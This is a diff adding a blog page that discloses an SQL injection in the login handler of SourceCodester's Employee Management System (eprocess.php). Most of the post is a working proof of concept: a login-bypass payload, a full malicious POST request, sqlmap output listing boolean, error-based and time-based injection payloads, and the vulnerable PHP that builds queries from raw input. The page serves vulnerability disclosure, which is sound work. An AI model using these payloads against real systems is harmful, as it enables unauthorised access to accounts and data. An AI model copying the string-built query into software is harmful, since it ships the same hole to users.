@@ -1,0 +1,230 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHP代码审计—Employee Management System eprocess.php SQL Injection | bewhale&#39;s blog</title>
+
+<link rel="shortcut icon" href="https://bewhale.github.io/favicon.ico?v=1666713403567">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bewhale.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            bewhale&#39;s blog
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/tools" class="menu gt-a-link">
+                    在线工具
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1666713403567"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHP代码审计—Employee Management System eprocess.php SQL Injection
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-08-08 ·
+                    </time>
+                    
+                        <a href="https://bewhale.github.io/tag/zuB-zqMRV/" class="post-tags">
+                            # PHP代码审计
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/B1lqNzXXY3/" class="post-tags">
+                            # SourceCodester
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/Fd7HN4_Qg/" class="post-tags">
+                            # SQL Injection
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="sourcecodester-employee-management-system-eprocessphp-sql-injection">SourceCodester Employee Management System eprocess.php SQL Injection</h1>
+<h1 id="vendor-homepage">Vendor Homepage:</h1>
+<p>https://www.sourcecodester.com/php/14432/employee-management-system-using-php.html</p>
+<h1 id="source-code-download">Source Code Download：</h1>
+<p>https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip</p>
+<h1 id="proof-of-concept">Proof of Concept</h1>
+<p>Step 1: Open the URL http://127.0.0.1/ems/elogin.html</p>
+<p>Step 2: Use payload <code>1' or 1 #</code>  in Email and anything in Password</p>
+<p>Step 3: login success</p>
+<h1 id="malicious-request">Malicious Request.</h1>
+<pre><code>POST /ems/process/eprocess.php HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 40
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47
+Referer: http://192.168.88.195/ems/elogin.html
+Accept-Encoding: gzip, deflate
+Connection: close
+
+mailuid=1%27+or+1+%23&amp;pwd=1&amp;login-submit=Login
+</code></pre>
+<h1 id="sqlmap">Sqlmap</h1>
+<pre><code class="language-php">---
+Parameter: mailuid (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: mailuid=-2408' OR 3144=3144#&amp;pwd=1&amp;login-submit=Login
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: mailuid=1' OR (SELECT 8327 FROM(SELECT COUNT(*),CONCAT(0x7171707871,(SELECT (ELT(8327=8327,1))),0x7162787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pIQl&amp;pwd=1&amp;login-submit=Login
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: mailuid=1' AND (SELECT 4704 FROM (SELECT(SLEEP(5)))vpmb)-- thNh&amp;pwd=1&amp;login-submit=Login
+---
+</code></pre>
+<h1 id="code">code</h1>
+<p><code>/process/eprocess.php</code>  line 5-12，</p>
+<pre><code class="language-php">$email = $_POST['mailuid'];
+$password = $_POST['pwd'];
+
+$sql = &quot;SELECT * from `employee` WHERE email = '$email' AND password = '$password'&quot;;
+$sqlid = &quot;SELECT id from `employee` WHERE email = '$email' AND password = '$password'&quot;;
+
+$result = mysqli_query($conn, $sql);
+$id = mysqli_query($conn , $sqlid);
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/bewhale" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/bewhale" target="_blank">bewhale</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
